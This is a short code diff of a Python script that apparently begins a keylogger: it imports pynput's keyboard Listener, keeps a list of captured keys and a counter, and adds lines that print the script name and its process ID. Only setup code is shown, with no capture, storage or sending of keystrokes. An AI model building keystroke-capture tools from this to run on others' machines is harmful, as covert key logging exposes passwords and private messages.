@@ -1,7 +1,12 @@
 import pynput 
 import datetime
-from pynput.keyboard import Key, Listener
-# Listener listen to key events
+from pynput.keyboard import Key, Listener # Listener listen to key events
+import os
+import sys
+
+print(sys.argv[0][:-3])
+pid = str(os.getpid())
+print("Current process PID: " + pid)
 
 count = 0
 keys = []
